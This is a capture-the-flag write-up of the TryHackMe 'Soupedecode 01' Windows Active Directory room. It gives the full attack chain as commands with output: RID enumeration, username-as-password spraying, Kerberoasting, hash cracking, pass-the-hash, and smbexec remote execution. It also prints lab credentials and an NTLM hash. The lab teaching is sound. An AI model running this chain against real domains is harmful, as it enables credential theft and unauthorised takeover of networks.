---
icon: windows
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Soupedecode 01 Room Walkthrough

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **Soupedecode 01** _challenge room on TryHackMe. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### Machine Info: <a href="#id-6c7b" id="id-6c7b"></a>

* **Machine Name:** Soupedecode 01
* **Machine Type:** Windows, Active Directory
* **Difficulty:** Easy
* **Machine Link:** \[[https://tryhackme.com/room/soupedecode01](https://tryhackme.com/room/soupedecode01)]

### Initial Enumeration <a href="#ff11" id="ff11"></a>

```bash
 nmap -p- -A -sC -vv --min-rate 10000 10.201.122.253 -oN scan.txt 

Not shown: 65525 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 124 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 124 Microsoft Windows Kerberos (server time: 2025-09-26 15:28:30Z)
135/tcp   open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 124
593/tcp   open  ncacn_http    syn-ack ttl 124 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 124 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 124 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-17T21:35:42
| Not valid after:  2025-12-17T21:35:42
| MD5:   8660:d3bc:0e75:671b:8ffd:9a7e:fafb:60b5
| SHA-1: 4349:710e:63b9:e96c:4a8a:c557:c8c4:d217:482f:3673
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQbquejXfqJohC9UQLVBR+cTANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZEQzAxLlNPVVBFREVDT0RFLkxPQ0FMMB4XDTI1MDYxNzIxMzU0
| MloXDTI1MTIxNzIxMzU0MlowITEfMB0GA1UEAxMWREMwMS5TT1VQRURFQ09ERS5M
| T0NBTDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALRjne/Ks+HtZcXt
| BKKUbbTDbTX3AFH72vg8qzFVfmpzCuY6E+nBFUSb7yiQmziAIEWziiRzxh8I6FJ0
| tP3WMdPv1aATe4tAqw9BmlZZu+vcNAMv2ERBAIrWU51dYGBXIuIv/RORbRpvlhdZ
| 9KANtId+bAzFxO/1cl3jrMX512gn1uzz8OrZWH+Bjps6OaZ9qTpu/VWmJTkQIJgM
| LlvMEczaoGzudpCl6i5F3cnGRVU9Lk+sdapL2ILgaZ49EipSj64iUZBi63LyqTJV
| WS81kKzlwg1MS32jFtBRn2e8WPR1NCrB2d6OHGJyCfAlI9C0ViauKHiv6rEMm8tv
| M2pIrNUCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQAnVIHgBDAr9dDRiG4z8D4k2cF+YprxBcWpuvJc
| UvLNF71bezDuD0NwQxJcLV4ocnI/xCakLzG/VUNatbb3QAY0Bv6G3Rpi9Qytrafe
| rED0pe9DsYadx07ci9/FFCI3dq9AhNqLhk+0Z4xOobvhJFkyX1KxGUBp0qnxhw6t
| a0yNa8q4QX1DMNBa3L61VwFEKdHEho02YJ1rH3r/GUXNGhr9dWO5iMOrXmqtucQv
| x0M7qS02MAv3FEEHUk8gb+MlbQHNZmTpuLTJCThgBy1gxxEJ6ovTar8W/topGCKS
| 3JApQpPFWqxW+yWoahcYkGr9q1SKRX1GIq2mXN3NY8A9Rg36
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-26T15:29:40+00:00
|_ssl-date: 2025-09-26T15:30:19+00:00; -1s from scanner time.
49664/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 124 Microsoft Windows RPC over HTTP 1.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=9/26%OT=53%CT=%CU=%PV=Y%DS=5%DC=T%G=N%TM=68D6B18F%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=A)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=A)
OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M508NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.006 days (since Fri Sep 26 20:52:17 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-26T15:29:44
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33072/tcp): CLEAN (Timeout)
|   Check 2 (port 11054/tcp): CLEAN (Timeout)
|   Check 3 (port 53607/udp): CLEAN (Timeout)
|   Check 4 (port 13820/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   48.54 ms  10.17.0.1
2   ... 4
5   258.05 ms 10.201.122.253
```

Add `SOUPEDECODE.LOCAL` and `DC01.SOUPEDECODE.LOCAL` to `/etc/hosts` file.

```bash
sudo echo "10.201.122.253 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
```

### Enumerate the SMB service : <a href="#id-28f7" id="id-28f7"></a>

We try to enumerate SMB but we don’t know the user name. So, we try to enumerate by using the default “Guest” username.

```bash
sudo netexec smb 10.201.122.253 -u 'Guest' -p '' --shares

SMB         10.201.122.253  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.201.122.253  445    DC01             [+] SOUPEDECODE.LOCAL\Guest: 
SMB         10.201.122.253  445    DC01             [*] Enumerated shares
SMB         10.201.122.253  445    DC01             Share           Permissions     Remark
SMB         10.201.122.253  445    DC01             -----           -----------     ------
SMB         10.201.122.253  445    DC01             ADMIN$                          Remote Admin
SMB         10.201.122.253  445    DC01             backup                          
SMB         10.201.122.253  445    DC01             C$                              Default share
SMB         10.201.122.253  445    DC01             IPC$            READ            Remote IPC
SMB         10.201.122.253  445    DC01             NETLOGON                        Logon server share 
SMB         10.201.122.253  445    DC01             SYSVOL                          Logon server share 
SMB         10.201.122.253  445    DC01             Users 
```

Here we see that IPC$ is readable, so we further enumerate domain users, we perform a RID brute-force.

```bash
sudo nxc smb soupdecode.local -u guest -p '' --rid
```

In the output we see many domain users. We store this into a file called `rid-userlist.txt` for later use.

```bash
sudo nxc smb SOUPEDECODE.LOCAL -u guest -p '' --rid --no-brute > rid-user-list.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9uBr_HPy8QzBNP98zGkzwA.png" alt="" height="266" width="700"><figcaption></figcaption></figure>

Now we try to create a user list called username.txt file by filtering this `rid-user-list.txt` file for kerberoasting or bruteforcing the accounts.

```bash
grep 'SOUPEDECODE\\' rid-user-list.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*YtDb_PIlDYdA8MYEnhsg_Q.png" alt="" height="155" width="700"><figcaption></figcaption></figure>

Now by using this word-list we try to find a valid username and password. but we should **not brute-force** otherwise the accounts could get **locked**.

So, we can use this command to find username and password:

```bash
sudo nxc smb SOUPEDECODE.LOCAL -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cpn3meDcki01-EKFcV0EqA.png" alt="" height="223" width="700"><figcaption></figcaption></figure>

We try to enumerate the shares and see we are able to read the Users directory.

```bash
sudo nxc smb SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' --shares
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*hE75iiZHenxDAmX0YUc2Hg.png" alt="" height="158" width="700"><figcaption></figcaption></figure>

Now we try to connect with SMB share and we found this:

```bash
smbclient //soupedecode.local/Users  -U ybob317
```

<figure><img src="https://miro.medium.com/v2/resize:fit:642/1*rFLFDOL4zsfuvttBnkU4cw.png" alt="" height="266" width="642"><figcaption></figcaption></figure>

After many analysis we found the User.txt (User Flag) from `ybob317/Desktop`.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*SK9gGVleCbx_082BmZe4yg.png" alt="" height="251" width="700"><figcaption></figcaption></figure>

Now for PrivEsc we look into Active Directory.

In the room description we see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*3LeqtLcdbGCCPYMRHKElng.png" alt="" height="132" width="700"><figcaption></figcaption></figure>

So, with the valid credentials `ybob317:ybob317` we could try some Kerberoasting. We are able to retrieve some hashes.

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.72.27 -request -output krb_hashes.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Zoazp_U1yAHhVu7GYFMxqQ.png" alt="" height="194" width="700"><figcaption></figcaption></figure>

After many research we can notice that the `file_svc` hash is crackable.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*osdJWIhshhiIMOFZH-ZZxA.png" alt="" height="141" width="700"><figcaption></figcaption></figure>

Now we try to crack the hash by using `john`.

Before doing this we save the `file_svc` hash to another file called hash.txt.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*CZbYQ1bgq0H9dXaSiKyWUw.png" alt="" height="139" width="700"><figcaption></figcaption></figure>

We successfully get password. Now by using the credentials of `file_svc` to enumerate the share, and we see that we are able to read the `backup` share.

```bash
sudo nxc smb SOUPEDECODE.LOCAL -u 'file_svc' -p 'Password123!!' --shares
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WOtiOSCLUWYGg5ZQQo4RrA.png" alt="" height="167" width="700"><figcaption></figcaption></figure>

Now we try to retrieve the content of the `backup` share. And we found this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*24Q3Agbz0Kz_LoCPY8SThg.png" alt="" height="158" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*kZznaNj9htx7prxZVjKT3Q.png" alt="" height="189" width="700"><figcaption></figcaption></figure>

Now first we need to retrieve the users from the list.

```bash
cat backup_extract.txt | cut -d ':' -f 1 > BackupUsers.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:544/1*oHgEs70wtYv2oGfx78k5jg.png" alt="" height="262" width="544"><figcaption></figcaption></figure>

Next we extract the NTLM hash from the `backup_extract.txt` file:

```bash
cut -d: -f4 backup_extract.txt > NTLMHash.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:464/1*7l6WBzINANv-VeMTYP8qhQ.png" alt="" height="258" width="464"><figcaption></figcaption></figure>

Now we perform Pass-The-Hash attack to find the valid user and hash.

```bash
sudo nxc smb SOUPEDECODE.LOCAL -u BackupUsers.txt -H NTLMHash.txt --no-brute
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*D8hxSYCnIjU1nbQsdacznA.png" alt="" height="86" width="700"><figcaption></figcaption></figure>

And we found valid hash for FileServer$:

```bash
FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
```

Next, we use `Smbexec` to execute remote commands over SMB. We have sufficient access rights to access `C:Users\Adminstrator\Desktop`, where we find the root flag `root.txt`.

```bash
impacket-smbexec 'FileServer$'@SOUPEDECODE.LOCAL -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*J7CSVFfaYQSqyBLjGvjPmg.png" alt="" height="101" width="700"><figcaption></figcaption></figure>

We successfully get the Administrator and root flag.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*vpFA81mTHqTre7hz1Y42_g.png" alt="" height="145" width="700"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-80cd" id="id-80cd"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
